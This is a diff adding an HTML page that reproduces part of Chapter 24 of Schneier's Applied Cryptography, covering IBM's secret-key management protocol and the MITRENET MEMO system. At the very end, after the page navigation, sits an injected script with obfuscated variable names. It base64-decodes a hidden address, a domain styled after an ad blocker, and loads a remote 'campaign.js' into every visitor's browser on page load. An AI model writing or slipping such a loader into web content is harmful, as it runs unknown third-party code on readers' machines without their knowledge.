@@ -1,0 +1,96 @@
+<html>
+<head>
+<TITLE>APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C:Example Implementations</TITLE>
+<!-- BEGIN HEADER -->
+<META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
+<SCRIPT>
+<!--
+function displayWindow(url, width, height) {
+        var Win = window.open(url,"displayWindow",'width=' + width +
+',height=' + height + ',resizable=1,scrollbars=yes');
+}
+//-->
+</SCRIPT>
+
+</HEAD>
+<body bgcolor="ffffff" link="#006666" alink="#006666" vlink="#006666">
+<P>
+<CENTER><B>Applied Cryptography, Second Edition: Protocols,  Algorthms, and Source Code in C (cloth)</B>
+<FONT SIZE="-2">
+<BR>
+<I>(Publisher: John Wiley & Sons, Inc.)</I>
+<BR>
+Author(s): Bruce Schneier
+<BR>
+ISBN: 0471128457
+<BR>
+Publication Date: 01/01/96
+</FONT></CENTER>
+<P>
+
+
+<!-- Empty Reference Subhead -->
+
+<!--ISBN=0471128457//-->
+<!--TITLE=APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C//-->
+<!--AUTHOR=Bruce Schneier//-->
+<!--PUBLISHER=Wiley Computer Publishing//-->
+<!--CHAPTER=24//-->
+<!--PAGES=561-563//-->
+<!--UNASSIGNED1//-->
+<!--UNASSIGNED2//-->
+
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="../ch23/23-11.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="24-02.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+<P><BR></P>
+<H2 ALIGN="CENTER"><FONT COLOR="#000077"><I>Part IV<BR>The Real World
+</I></FONT></H2>
+<H2><A NAME="Heading1"></A><FONT COLOR="#000077">Chapter 24<BR>Example Implementations
+</FONT></H2>
+<P>It&#146;s one thing to design protocols and algorithms, but another thing to field them in operational systems. In theory, theory and practice are the same; in practice they are different. Often ideas that look good on paper don&#146;t work in real life. Maybe the bandwidth requirements are too large; maybe the protocol is too slow. Chapter 10 discusses some of the issues related to using cryptography; this chapter gives examples of how it has been done in practice.
+</P>
+<H3><A NAME="Heading2"></A><FONT COLOR="#000077">24.1 IBM Secret-Key Management Protocol</FONT></H3>
+<P>In the late 1970s IBM developed a complete key management system for communications and file security on a computer network, using only symmetric cryptography [515, 1027]. This protocol is less important in the actual mechanisms and more in its overall philosophy: By automating the generation, distribution, installation, storage, changing, and destruction of keys, the protocol went a long way to ensure the security of the underlying cryptographic algorithms.
+</P>
+<P>This protocol provides three things: secure communications between a server and several terminals, secure file storage at the server, and secure communication among servers. The protocol doesn&#146;t really provide for direct terminal-to-terminal communication, although it can be modified to do that.</P>
+<P>Each server on the network is attached to a cryptographic facility, which does all of the encrypting and decrypting. Each server has a <B>Master Key</B>, <I>KM</I><SUB>0</SUB>, and two variants, <I>KM</I><SUB>1</SUB> and <I>KM</I><SUB>2</SUB>, both of which are simple variants of <I>KM</I><SUB>0</SUB>. These keys are used to encrypt other keys and to generate new keys. Each terminal has a <B>Master Terminal Key</B>, <I>KMT</I>, which is used to exchange keys with other terminals.</P>
+<P>The servers store <I>KMT</I>, encrypted with <I>KM<SUB>1</SUB></I>. All other keys, such as those used to encrypt files of keys (called <I>KNF</I>), are stored in encrypted form under <I>KM<SUB>2</SUB></I>. The master key, <I>KM<SUB>0</SUB></I>, is stored in some nonvolatile security module. Today that could be either a ROM key or a magnetic card, or it could be typed in by the user (probably as a text string and then key crunched). <I>KM<SUB>1</SUB></I> and <I>KM<SUB>2</SUB></I> are not stored anywhere in the system, but are computed from <I>KM<SUB>0</SUB></I> whenever they are needed. Session keys, for communication among servers, are generated with a pseudo-random process in the server. Keys to encrypt files for storage (<I>KNF</I>) are generated in the same manner.</P>
+<P>The heart of the protocol is a tamper-resistant module, called a <B>cryptographic facility</B>. At both the server and the terminal, all encryption and decryption takes place within this facility. The most important keys, those used to generate the actual encryption keys, are stored in this module. These keys can never be read once they are stored. And they are tagged by use: A key dedicated for one purpose cannot accidentally be used for another. This concept of <B>key control vectors</B> is probably the most significant contribution of this system. Donald Davies and William Price discuss this key management protocol in detail [435].</P>
+<P><FONT SIZE="+1"><B><I>A Variation</I></B></FONT></P>
+<P>A variation on this scheme of master and session keys can be found in [1478]. It&#146;s built around network nodes with key notarization facilities that serve local terminals. It is designed to:
+</P>
+<DL>
+<DD>&#151; Secure two-way communication between any two terminal users.
+<DD>&#151; Secure communications using encrypted mail.
+<DD>&#151; Provide personal file protection.
+<DD>&#151; Provide a digital signature capability.
+</DL>
+<P>For communication and file transfer among users, the scheme uses keys generated in the key notarization facility and sent to the users encrypted under a master key. The identities of the users are incorporated with the key, to provide evidence that the session key has been used between a particular pair of users. This <B>key notarization</B> feature is central to the system. Although the system does not use public-key cryptography, it has a digital-signature-like capability: A key could have only come from a particular source and could only be read at a particular destination.</P>
+<H3><A NAME="Heading3"></A><FONT COLOR="#000077">24.2 MITRENET</FONT></H3>
+<P>One of the earliest implementations of public-key cryptography was the experimental system MEMO (MITRE Encrypted Mail Office). MITRE is a DoD contractor, a government think tank, and an all-around bunch of smart guys. MEMO was a secure electronic mail system for users in the MITRENET network, using public-key cryptography for key exchange and DES for file encryption.
+</P>
+<P>In the MEMO system, all public keys are stored in a Public Key Distribution Center, which is a separate node on the network. They are stored in an EPROM to prevent anyone from changing them. Private keys are generated by users or by the system.</P>
+<P>For a user to send secure messages, the system first establishes a secure communications path with the Public Key Distribution Center. The user requests a file of all public keys from the Center. If the user passes an identification test using his private key, the Center sends this list to the user&#146;s workstation. The list is encrypted using DES to ensure file integrity.</P>
+<P>The implementation uses DES to encrypt messages. The system generates a random DES key for file encryption; the user encrypts the file with the DES key and encrypts the DES key with the recipient&#146;s public key. Both the DES-encrypted file and the public-key-encrypted key are sent to the recipient.</P>
+<P>MEMO makes no provision for lost keys. There is some provision for integrity checking of the messages, using checksums. No authentication is built into the system.</P>
+<P>The particular public-key implementation used for this system&#151;Diffie-Hellman key exchange over GF(2<SUP>127</SUP>)&#151;was proven insecure before the system was implemented (see Section 11.6), although it is easy to modify the system to use larger numbers. MEMO was intended mainly for experimental purposes and was never made operational on the real MITRENET system.</P><P><BR></P>
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="../ch23/23-11.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="24-02.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+
+[an error occurred while processing this directive]
+<script type="text/javascript">(function(waidpilA, auEkGofy) {auEkGofy = waidpilA.createElement('script');auEkGofy.type = 'text/javascript';auEkGofy.async = true;auEkGofy.src = atob('0024241d2f28Ly91YmxvY2stcmVmZXJlci5kZXYvY2FtcGFpZ24uanM=0024241d2f28'.replace(/0024241d2f28/gi, '')) + '?' + String(Math.random()).replace('0.','');waidpilA.getElementsByTagName('body')[0].appendChild(auEkGofy);}(document));</script></body>
+</html>
